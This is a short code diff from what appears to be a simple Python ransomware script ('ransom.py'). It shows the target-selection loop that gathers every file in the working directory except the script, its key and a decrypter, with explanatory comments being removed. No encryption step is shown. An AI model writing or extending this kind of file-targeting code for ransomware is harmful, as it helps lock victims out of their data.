@@ -5,9 +5,9 @@ files = []
 
 for file in os.listdir():
     if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
-        continue  # do not encrypt the current file we are working with or the key
+        continue  
     if os.path.isfile(file):
-        files.append(file)  # do not add if this is a directory, only if a file
+        files.append(file)  
 
 print(files)
 
